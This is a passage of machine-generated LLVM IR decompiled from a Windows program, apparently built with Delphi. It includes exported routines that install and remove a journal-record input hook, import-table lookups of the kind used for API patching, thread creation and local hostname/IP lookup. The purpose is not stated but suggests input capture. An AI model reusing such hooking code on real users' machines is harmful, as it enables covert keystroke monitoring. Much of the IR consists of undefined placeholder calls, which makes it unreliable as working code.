  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1796
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1796
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1796
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1796
  br i1 %22, label %dec_label_pc_4070d4, label %dec_label_pc_407114, !insn.addr !1796

dec_label_pc_407114:                              ; preds = %dec_label_pc_4070d4, %dec_label_pc_4070b0
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1802
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1803
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1804
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1804
  store i32 4223281, i32* %25, align 4, !insn.addr !1804
  %26 = call i32 @"@LStrClr"(), !insn.addr !1805
  ret i32 %26, !insn.addr !1806
}

define i32 @function_40712a() local_unnamed_addr {
dec_label_pc_40712a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1807
  ret i32 %0, !insn.addr !1807
}

define i32 @function_40712f() local_unnamed_addr {
dec_label_pc_40712f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1808
}

define i32 @function_407131(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407131:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1809
}

define i32 @function_40713c() local_unnamed_addr {
dec_label_pc_40713c:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1810
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1810
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1810
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1811
  %2 = call i32 @function_406fd0(), !insn.addr !1812
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1813
  %4 = call i32 @function_4070b0(), !insn.addr !1814
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1815
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1816
  %6 = call i32 @"@LStrClr"(), !insn.addr !1817
  ret i32 %6, !insn.addr !1818
}

define i32 @function_40719d() local_unnamed_addr {
dec_label_pc_40719d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1819
  ret i32 %0, !insn.addr !1819
}

define i32 @function_4071a2() local_unnamed_addr {
dec_label_pc_4071a2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1820
}

define i32 @function_4071a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4071a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1821
}

define i32 @function_4071bf() local_unnamed_addr {
dec_label_pc_4071bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1822
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1822
  store i32 %3, i32* %4, align 4, !insn.addr !1822
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1823
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1823
  %9 = add i8 %6, %8, !insn.addr !1823
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1823
  store i8 %9, i8* %10, align 1, !insn.addr !1823
  %11 = add i32 %2, 81, !insn.addr !1824
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1824
  %13 = load i8, i8* %12, align 1, !insn.addr !1824
  %14 = trunc i32 %1 to i8, !insn.addr !1824
  %15 = add i8 %13, %14, !insn.addr !1824
  store i8 %15, i8* %12, align 1, !insn.addr !1824
  %16 = load i32, i32* %eax, align 4, !insn.addr !1825
  ret i32 %16, !insn.addr !1825
}

define x86_fp80 @function_4071c7() local_unnamed_addr {
dec_label_pc_4071c7:
  %0 = call x86_fp80 @__decompiler_undefined_function_9()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1826
  ret x86_fp80 %1, !insn.addr !1827
}

define i32 @function_4071cc() local_unnamed_addr {
dec_label_pc_4071cc:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1828
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1829
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1829
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1829
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1830
  %3 = call i32 @function_406fd0(), !insn.addr !1831
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1832
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1833
  %6 = icmp eq i32 %5, 180, !insn.addr !1834
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1835
  br i1 %6, label %dec_label_pc_40722f, label %dec_label_pc_40720a, !insn.addr !1835

dec_label_pc_40720a:                              ; preds = %dec_label_pc_4071cc
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1836
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1837
  %10 = icmp eq i1 %9, false, !insn.addr !1838
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1838
  br i1 %10, label %dec_label_pc_40722f, label %dec_label_pc_407216, !insn.addr !1838

dec_label_pc_407216:                              ; preds = %dec_label_pc_40720a
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1839
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40722f

dec_label_pc_40722f:                              ; preds = %dec_label_pc_407216, %dec_label_pc_4071cc, %dec_label_pc_40720a
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1840
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1841
  %13 = add i32 %esp.1, 8, !insn.addr !1842
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1842
  store i32 4223570, i32* %14, align 4, !insn.addr !1842
  %15 = call i32 @"@LStrClr"(), !insn.addr !1843
  ret i32 %15, !insn.addr !1844
}

define i32 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1845
  ret i32 %0, !insn.addr !1845
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1846
}

define i32 @function_407252(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407252:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1847
}

define i32 @function_407268() local_unnamed_addr {
dec_label_pc_407268:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1848
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1848
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1848
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1849
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1850
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1850
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1851
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1852
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1853
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1854
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1854
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1855
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1856
  %16 = ashr i32 %15, 31, !insn.addr !1857
  %17 = zext i32 %15 to i64, !insn.addr !1858
  %18 = zext i32 %16 to i64, !insn.addr !1858
  %19 = mul i64 %18, 4294967296, !insn.addr !1858
  %20 = or i64 %19, %17, !insn.addr !1858
  %21 = zext i32 %4 to i64, !insn.addr !1858
  %22 = sdiv i64 %20, %21, !insn.addr !1858
  %23 = trunc i64 %22 to i32, !insn.addr !1858
  ret i32 %23, !insn.addr !1859
}

define i32 @function_4072c4() local_unnamed_addr {
dec_label_pc_4072c4:
  %esp.0.reg2mem = alloca i32, !insn.addr !1860
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1861
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1861
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1861
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1862
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1863
  %3 = icmp eq i32 %2, 0, !insn.addr !1863
  br i1 %3, label %dec_label_pc_407300, label %dec_label_pc_4072ed, !insn.addr !1864

dec_label_pc_4072ed:                              ; preds = %dec_label_pc_4072c4
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1865
  store i32 0, i32* %4, align 4, !insn.addr !1865
  br label %dec_label_pc_407300, !insn.addr !1866

dec_label_pc_407300:                              ; preds = %dec_label_pc_4072ed, %dec_label_pc_4072c4
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1867
  %6 = icmp eq i32 %5, 0, !insn.addr !1867
  br i1 %6, label %dec_label_pc_407314, label %dec_label_pc_40730a, !insn.addr !1868

dec_label_pc_40730a:                              ; preds = %dec_label_pc_407300
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1869
  %8 = icmp eq i32 %7, 0, !insn.addr !1869
  %9 = icmp eq i1 %8, false, !insn.addr !1870
  br i1 %9, label %dec_label_pc_40731e, label %dec_label_pc_407314, !insn.addr !1870

dec_label_pc_407314:                              ; preds = %dec_label_pc_40730a, %dec_label_pc_407300
  %10 = call i32 @function_4073f8(), !insn.addr !1871
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1872
  br label %dec_label_pc_4073bb, !insn.addr !1872

dec_label_pc_40731e:                              ; preds = %dec_label_pc_40730a
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1873
  %12 = icmp eq i8 %11, 0, !insn.addr !1873
  br i1 %12, label %dec_label_pc_407347, label %dec_label_pc_407328, !insn.addr !1874

dec_label_pc_407328:                              ; preds = %dec_label_pc_40731e
  %13 = call i32 @function_406be0(), !insn.addr !1875
  %14 = icmp eq i32 %13, 0, !insn.addr !1876
  br i1 %14, label %dec_label_pc_407347, label %dec_label_pc_407340, !insn.addr !1877

dec_label_pc_407340:                              ; preds = %dec_label_pc_407328
  %15 = call i32 @function_4073f8(), !insn.addr !1878
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1879
  br label %dec_label_pc_4073bb, !insn.addr !1879

dec_label_pc_407347:                              ; preds = %dec_label_pc_407328, %dec_label_pc_40731e
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1880
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1881
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 3 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1882
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1883
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1884
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1884
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1885
  %23 = call i32 @function_4073f8(), !insn.addr !1886
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1886
  br label %dec_label_pc_4073bb, !insn.addr !1886

dec_label_pc_4073bb:                              ; preds = %dec_label_pc_407347, %dec_label_pc_407340, %dec_label_pc_407314
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1887
  %25 = load i32, i32* %24, align 4, !insn.addr !1887
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1888
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1889
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1889
  store i32 4223960, i32* %27, align 4, !insn.addr !1889
  %28 = call i32 @"@LStrClr"(), !insn.addr !1890
  ret i32 %28, !insn.addr !1891
}

define i32 @function_4073d1() local_unnamed_addr {
dec_label_pc_4073d1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1892
  ret i32 %0, !insn.addr !1892
}

define i32 @function_4073d6() local_unnamed_addr {
dec_label_pc_4073d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1893
}

define i32 @function_4073d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4073d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1894
}

define i32 @function_4073f8() local_unnamed_addr {
dec_label_pc_4073f8:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1895
  %1 = call i32 @"@LStrClr"(), !insn.addr !1896
  ret i32 %1, !insn.addr !1897
}

define i32 @function_407410() local_unnamed_addr {
dec_label_pc_407410:
  %eax.0.reg2mem = alloca i32, !insn.addr !1898
  %esp.0.reg2mem = alloca i32, !insn.addr !1898
  %esp.15.reg2mem = alloca i32, !insn.addr !1898
  %storemerge6.reg2mem = alloca i32, !insn.addr !1898
  %.reg2mem = alloca i32, !insn.addr !1898
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1898
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1899
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1900
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1901
  %5 = call i32 @"@LStrClr"(), !insn.addr !1902
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1903
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1903
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1904
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1905
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1906
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1906
  %11 = icmp eq %hostent* %9, null, !insn.addr !1907
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1908
  br i1 %11, label %dec_label_pc_40746e, label %dec_label_pc_407448, !insn.addr !1908

dec_label_pc_407448:                              ; preds = %dec_label_pc_407410
  %12 = add i32 %10, 12, !insn.addr !1909
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1909
  %14 = load i32, i32* %13, align 4, !insn.addr !1909
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1910
  %16 = load i32, i32* %15, align 4, !insn.addr !1910
  %17 = icmp eq i32 %16, 0, !insn.addr !1911
  %18 = icmp eq i1 %17, false, !insn.addr !1912
  br i1 %18, label %dec_label_pc_40744f.lr.ph, label %dec_label_pc_407469, !insn.addr !1912

dec_label_pc_40744f.lr.ph:                        ; preds = %dec_label_pc_407448
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1905
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_40744f

dec_label_pc_40744f:                              ; preds = %dec_label_pc_40744f.lr.ph, %dec_label_pc_407461
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1913
  %21 = icmp eq i1 %20, false, !insn.addr !1914
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1914
  br i1 %21, label %dec_label_pc_407461, label %dec_label_pc_407453, !insn.addr !1914

dec_label_pc_407453:                              ; preds = %dec_label_pc_40744f
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1915
  %23 = load i32, i32* %22, align 4, !insn.addr !1915
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1915
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1915
  store i32 %23, i32* %25, align 4, !insn.addr !1915
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1916
  %27 = call i32 @StrPas(), !insn.addr !1917
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1917
  br label %dec_label_pc_407461, !insn.addr !1917

dec_label_pc_407461:                              ; preds = %dec_label_pc_407453, %dec_label_pc_40744f
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1918
  %29 = mul i32 %28, 4, !insn.addr !1910
  %30 = add i32 %29, %14, !insn.addr !1910
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1910
  %32 = load i32, i32* %31, align 4, !insn.addr !1910
  %33 = icmp eq i32 %32, 0, !insn.addr !1911
  %34 = icmp eq i1 %33, false, !insn.addr !1912
  store i32 %32, i32* %.reg2mem, !insn.addr !1912
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1912
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1912
  br i1 %34, label %dec_label_pc_40744f, label %dec_label_pc_407469, !insn.addr !1912

dec_label_pc_407469:                              ; preds = %dec_label_pc_407461, %dec_label_pc_407448
  %35 = call i32 @WSACleanup(), !insn.addr !1919
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1919
  br label %dec_label_pc_40746e, !insn.addr !1919

dec_label_pc_40746e:                              ; preds = %dec_label_pc_407469, %dec_label_pc_407410
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1920
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1921
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1921
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1921
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1922
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1923
  %3 = add i32 %2, 1, !insn.addr !1923
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1923
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1924
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1925
  ret i32 0, !insn.addr !1926
}

define i32 @function_4074a1() local_unnamed_addr {
dec_label_pc_4074a1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1927
  ret i32 %0, !insn.addr !1927
}

define i32 @function_4074a6() local_unnamed_addr {
dec_label_pc_4074a6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1928
}

define i32 @function_4074a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4074a8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1929
}

define i32 @function_4074ac() local_unnamed_addr {
dec_label_pc_4074ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1930
  %2 = add i32 %1, -1, !insn.addr !1930
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1930
  ret i32 %0, !insn.addr !1931
}

define i32 @function_4074b4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4074b4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1932
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1932
  ret i32 %2, !insn.addr !1933
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_4074d4:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224180 to i32*), i32 3), !insn.addr !1934
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1934
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1935
  %3 = icmp eq i32* %1, null, !insn.addr !1936
  %4 = icmp eq i1 %3, false, !insn.addr !1937
  %5 = sext i1 %4 to i32, !insn.addr !1938
  ret i32 %5, !insn.addr !1939
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407500:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1940
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1941
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1941
  %3 = sext i1 %2 to i32, !insn.addr !1941
  ret i32 %3, !insn.addr !1942
}

define i32 @function_40750c() local_unnamed_addr {
dec_label_pc_40750c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1943
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1943
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1943
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1944
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1945
  %3 = add i32 %2, 1, !insn.addr !1945
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1945
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1946
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1947
  ret i32 0, !insn.addr !1948
}

define i32 @function_407531() local_unnamed_addr {
dec_label_pc_407531:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1949
  ret i32 %0, !insn.addr !1949
}

define i32 @function_407536() local_unnamed_addr {
dec_label_pc_407536:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1950
}

define i32 @function_407538(i32 %arg1) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1951
}

define i32 @function_40753c() local_unnamed_addr {
dec_label_pc_40753c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1952
  %2 = add i32 %1, -1, !insn.addr !1952
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1952
  ret i32 %0, !insn.addr !1953
}

define i32* @function_407544(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_407544:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1954
  ret i32* %0, !insn.addr !1954
}

define i32 @function_40754c() local_unnamed_addr {
dec_label_pc_40754c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1955
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1955
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1955
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1956
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1957
  %3 = add i32 %2, 1, !insn.addr !1957
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !1957
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1958
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1959
  ret i32 0, !insn.addr !1960
}

define i32 @function_407571() local_unnamed_addr {
dec_label_pc_407571:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1961
  ret i32 %0, !insn.addr !1961
}

define i32 @function_407576() local_unnamed_addr {
dec_label_pc_407576:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1962
}

define i32 @function_407578(i32 %arg1) local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1963
}

define i32 @function_40757c() local_unnamed_addr {
dec_label_pc_40757c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1964
  %2 = add i32 %1, -1, !insn.addr !1964
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1964
  ret i32 %0, !insn.addr !1965
}

define i32 @function_4075dc(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4075dc:
  %esp.1.reg2mem = alloca i32, !insn.addr !1966
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1966
  %eax.0.reg2mem = alloca i32, !insn.addr !1966
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1967
  %7 = icmp eq i8 %6, 0, !insn.addr !1967
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1968
  br i1 %7, label %dec_label_pc_4075ef, label %dec_label_pc_4075e7, !insn.addr !1968

dec_label_pc_4075e7:                              ; preds = %dec_label_pc_4075dc
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1969
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1969
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1969
  br label %dec_label_pc_4075ef, !insn.addr !1969

dec_label_pc_4075ef:                              ; preds = %dec_label_pc_4075e7, %dec_label_pc_4075dc
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1970
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1971
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1971
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1971
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1972
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1972
  store i32 %13, i32* %15, align 4, !insn.addr !1972
  %16 = icmp eq i32* %12, null, !insn.addr !1973
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1974
  br i1 %16, label %dec_label_pc_407647, label %dec_label_pc_40760b, !insn.addr !1974

dec_label_pc_40760b:                              ; preds = %dec_label_pc_4075ef
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1975
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1976
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1976
  store i32 %17, i32* %19, align 4, !insn.addr !1976
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1977
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1978
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1978
  store i32 %20, i32* %22, align 4, !insn.addr !1978
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1979
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1979
  store i32 %arg3, i32* %24, align 4, !insn.addr !1979
  %25 = load i32, i32* %22, align 4, !insn.addr !1980
  %26 = add i32 %esp.0, -8, !insn.addr !1981
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1981
  store i32 %25, i32* %27, align 4, !insn.addr !1981
  %28 = add i32 %esp.0, -12, !insn.addr !1982
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1982
  store i32 %17, i32* %29, align 4, !insn.addr !1982
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1983
  %31 = ptrtoint i32* %30 to i32, !insn.addr !1983
  %32 = add i32 %esp.0, -16, !insn.addr !1984
